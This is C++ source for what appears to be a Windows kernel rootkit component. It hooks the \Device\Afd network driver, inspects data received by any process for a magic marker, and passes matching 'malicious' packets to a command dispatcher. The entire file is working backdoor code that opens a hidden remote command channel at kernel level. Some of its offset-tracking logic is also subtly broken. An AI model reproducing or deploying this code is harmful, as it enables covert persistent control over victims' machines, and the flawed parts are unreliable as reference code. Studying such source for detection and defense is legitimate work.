/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "AfdHook.h"
#include <ntddstor.h>

/**
	Initialize the AfdHook class, specifically the hooks on all FILE_OBJECTs with the device \Device\Afd.
	@param Status - Status of initialization.
*/
AfdHook::AfdHook (
	_In_ PNTSTATUS InitializeStatus
	)
{
	NTSTATUS status;
	UNICODE_STRING afdDeviceName;
	HANDLE afdDeviceHandle;
	OBJECT_ATTRIBUTES afdAttributes;
	IO_STATUS_BLOCK statusBlock;
	PFILE_OBJECT afdDeviceHandleObject;

	RtlInitUnicodeString(&afdDeviceName, AFD_DEVICE_NAME);
	afdDeviceHandleObject = NULL;
	this->AfdDeviceHook = NULL;

	InitializeObjectAttributes(&afdAttributes, &afdDeviceName, OBJ_KERNEL_HANDLE, NULL, NULL);

	//
	// Obtain a handle to the Afd device.
	//
	status = ZwCreateFile(&afdDeviceHandle, STANDARD_RIGHTS_ALL, &afdAttributes, &statusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("AfdHook!AfdHook: Failed to open a handle to the Afd device with status 0x%X.", status);
		goto Exit;
	}

	//
	// Obtain a pointer to the Afd device.
	//
	status = ObReferenceObjectByHandle(afdDeviceHandle, 0, *IoFileObjectType, KernelMode, RCAST<PVOID*>(&afdDeviceHandleObject), NULL);
	if (NT_SUCCESS(status) == FALSE)
	{
		DBGPRINT("AfdHook!AfdHook: Failed to open the Afd device with status 0x%X.", status);
		goto Exit;
	}

	NT_ASSERT(afdDeviceHandleObject->DeviceObject);
	DBGPRINT("AfdHook!AfdHook: Found Afd device 0x%llx.", afdDeviceHandleObject->DeviceObject);

	//
	// Create the FileObjHook instance.
	//
	this->AfdDeviceHook = new (NonPagedPool, AFD_FILE_HOOK_TAG) FileObjHook(afdDeviceHandleObject->DeviceObject, HookType::DirectHook, AfdHook::HookAfdIoctl, NULL);
	if (this->AfdDeviceHook == NULL)
	{
		DBGPRINT("AfdHook!AfdHook: Failed to allocate memory for Afd FileObjHook.");
		goto Exit;
	}
Exit:
	if (afdDeviceHandleObject)
	{
		ObDereferenceObject(afdDeviceHandleObject);
	}
	if (afdDeviceHandle)
	{
		ZwClose(afdDeviceHandle);
	}
	*InitializeStatus = status;
}

/**
	Hook for IOCTL requests made against \Device\Afd.
	@param OriginalFunction - The original IOCTL function for the Afd driver.
	@param DeviceObject - The real device object associated with the Afd driver.
	@param Irp - The IRP for the current request.
*/
NTSTATUS
AfdHook::HookAfdIoctl (
	_In_ DRIVER_DISPATCH OriginalFunction,
	_In_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
	)
{
	NTSTATUS returnStatus;
	PAFD_RECV_INFO recvInformation;
	PIO_STACK_LOCATION irpStackLocation;

	BOOLEAN deviceControlRequest;
	PVOID inputBuffer;
	ULONG inputBufferLength;
	DWORD ioControlCode;
	PFILE_OBJECT fileObject;
	PRKMUTEX fileObjectLock;

	ULONG totalRecvLength;
	PVOID recvBuffer;
	ULONG currentBufferOffset;
	ULONG currentCopyLength;

	BOOLEAN foundMagic;
	ULONG magicOffset;

	ULONG i;
	ULONG c;
	BYTE tempMagicBuffer[MAGIC_SIZE];
	ULONG tempMagicBufferCount;
	ULONG magicBufferOffset;

	PPACKET_DISPATCH packetDispatch;

	irpStackLocation = IoGetCurrentIrpStackLocation(Irp);
	deviceControlRequest = FALSE;
	inputBuffer = NULL;
	ioControlCode = 0;
	fileObject = NULL;
	foundMagic = FALSE;
	recvBuffer = NULL;
	packetDispatch = NULL;
	magicOffset = 0;
	fileObjectLock = NULL;
	tempMagicBufferCount = 0;
	magicBufferOffset = 0;

	//
	// Before calling the original function we need to save the passed parameters.
	//
	if (irpStackLocation->MajorFunction == IRP_MJ_DEVICE_CONTROL)
	{
		inputBuffer = irpStackLocation->Parameters.DeviceIoControl.Type3InputBuffer;
		inputBufferLength = irpStackLocation->Parameters.DeviceIoControl.InputBufferLength;
		ioControlCode = irpStackLocation->Parameters.DeviceIoControl.IoControlCode;
		fileObject = irpStackLocation->FileObject;
		deviceControlRequest = TRUE;
	}

	if (fileObject)
	{
		NT_ASSERT(fileObject->FsContext2);
		fileObjectLock = RCAST<PRKMUTEX>(fileObject->FsContext2);
		if (fileObjectLock)
		{
			//
			// Acquire a lock for the file object.
			//
			KeWaitForSingleObject(fileObjectLock, Executive, KernelMode, FALSE, NULL);
		}
	}
	
	//
	// Grab the actual return value.
	//
	returnStatus = OriginalFunction(DeviceObject, Irp);

	//
	// Only process IRP_MJ_DEVICE_CONTROL requests.
	//
	if (deviceControlRequest && fileObject && fileObjectLock)
	{
		if (ioControlCode == IOCTL_AFD_RECV)
		{
			recvInformation = RCAST<PAFD_RECV_INFO>(inputBuffer);
			totalRecvLength = SCAST<ULONG>(Irp->IoStatus.Information);

			//
			// Check if the total receive length is greater than our max.
			//
			if (totalRecvLength > PACKET_MAX_SIZE)
			{
				goto Exit;
			}

			//
			// TODO: Remove this later, not necessary.
			//
			DBGPRINT("AfdHook!HookAfdIoctl: recv ProcessId(%i), FileObject(0x%llx), BufferCount(%i), AfdFlags(%i), RecvLength(0x%X), Status(0x%X)", PsGetCurrentProcessId(), fileObject, recvInformation->BufferCount, recvInformation->AfdFlags, totalRecvLength, returnStatus);

			//
			// Dealing with user-mode memory, need to absolutely wrap in a try/catch.
			//
			__try
			{
				//
				// If the recv wasn't successful, not worth to check.
				//
				if (NT_SUCCESS(returnStatus) == FALSE)
				{
					goto Exit;
				}

				//
				// Sanity check to make sure we have at least one buffer.
				//
				if (recvInformation->BufferCount == 0)
				{
					goto Exit;
				}

				//
				// Make sure the first buffer can fit a magic value.
				//
				if (totalRecvLength < MAGIC_SIZE)
				{
					goto Exit;
				}

				//
				// Scan each buffer for the PACKET_MAGIC until
				// 1. We run out of buffers to scan, or
				// 2. We find our PACKET_MAGIC, or
				// 3. We scan more than the number of bytes actually received.
				//
				currentBufferOffset = 0;
				for (i = 0; i < recvInformation->BufferCount && foundMagic == FALSE && currentBufferOffset < totalRecvLength; i++)
				{
					for(c = 0; c < recvInformation->BufferArray[i].len; c++, currentBufferOffset++)
					{
						//
						// Sometimes the WSABUF buffers may be smaller than the MAGIC_SIZE,
						// yet may still contain part of the PACKET_MAGIC. Thus, we use
						// a temporary buffer so that we don't miss those edge cases.
						//
						// If we haven't gotten 4 bytes yet, set the appropriate byte in the temporary buffer.
						//
						if (tempMagicBufferCount < MAGIC_SIZE)
						{
							tempMagicBuffer[tempMagicBufferCount] = recvInformation->BufferArray[i].buf[c];
							tempMagicBufferCount++;
							//
							// If this is the first byte for the temporary buffer,
							// set the magicBufferOffset to the current buffer offset
							// so that we can find the magic easily later when
							// the packet is placed into one large buffer.
							//
							if (tempMagicBufferCount == 0)
							{
								magicBufferOffset = currentBufferOffset;
							}
						}
						else
						{
							//
							// Compare the temporary buffer to the magic constant.
							//
							if (*RCAST<PACKET_MAGIC_TYPE*>(tempMagicBuffer) == PACKET_MAGIC)
							{
								magicOffset = magicBufferOffset;
								foundMagic = TRUE;
								break;
							}
							//
							// If it's not the magic constant, reset the buffer count.
							//
							tempMagicBufferCount = 0;
						}

						//
						// If we've reached the total bytes received, break.
						//
						if (currentBufferOffset >= totalRecvLength)
						{
							break;
						}
					}
				}

				//
				// If we didn't find a magic, exit.
				//
				if (foundMagic == FALSE)
				{
					goto Exit;
				}

				DBGPRINT("AfdHook!HookAfdIoctl: Found magic in recv call.");

				//
				// First, allocate the space required to store the entire packet.
				//
				recvBuffer = ExAllocatePoolWithTag(PagedPool, totalRecvLength, MALICIOUS_PACKET_TAG);
				if (recvBuffer == NULL)
				{
					DBGPRINT("AfdHook!HookAfdIoctl: Failed to allocate space for recvBuffer.");
					goto Exit;
				}
				memset(recvBuffer, 0, totalRecvLength);

				//
				// For each buffer, add it to the recvBuffer.
				//
				currentBufferOffset = 0;
				for (i = 0; i < recvInformation->BufferCount; i++)
				{
					//
					// If the current buffer has a length greater than the remaining bytes,
					// copy only the remaining bytes.
					//
					currentCopyLength = totalRecvLength - currentBufferOffset;
					if (recvInformation->BufferArray[i].len <= currentCopyLength)
					{
						//
						// Otherwise, copy the entirety of the buffer.
						//
						currentCopyLength = recvInformation->BufferArray[i].len;
					}

					//
					// Copy the buffer.
					//
					memcpy_s(RCAST<PVOID>(RCAST<ULONG64>(recvBuffer) + currentBufferOffset), totalRecvLength - currentBufferOffset, recvInformation->BufferArray[i].buf, currentCopyLength);
					
					//
					// Increment the current offset by the amount of data we copied.
					//
					currentBufferOffset += currentCopyLength;

					//
					// If we've reached the total bytes received, break.
					//
					if (currentBufferOffset >= totalRecvLength)
					{
						break;
					}
				}

				//
				// Allocate the packet handler.
				//
				packetDispatch = new (NonPagedPool, AFD_PACKET_DISPATCH_TAG) PacketDispatch(fileObject,
																							DeviceObject,
																							recvInformation,
																							recvBuffer,
																							totalRecvLength,
																							magicOffset);
				if (NT_SUCCESS(packetDispatch->Process()) == FALSE)
				{
					DBGPRINT("AfdHook!HookAfdIoctl: Failed to process the packet.");
				}
				else
				{
					DBGPRINT("AfdHook!HookAfdIoctl: Processed the packet successfully.");
				}


			}
			__except (1)
			{
				DBGPRINT("AfdHook!HookAfdIoctl: WARNING: Exception.");
			}
		}
	}
Exit:
	if (fileObjectLock)
	{
		KeReleaseMutex(fileObjectLock, FALSE);
	}
	if (packetDispatch)
	{
		ExFreePoolWithTag(packetDispatch, AFD_PACKET_DISPATCH_TAG);
	}
	if (recvBuffer)
	{
		ExFreePoolWithTag(recvBuffer, MALICIOUS_PACKET_TAG);
	}
	return returnStatus;
}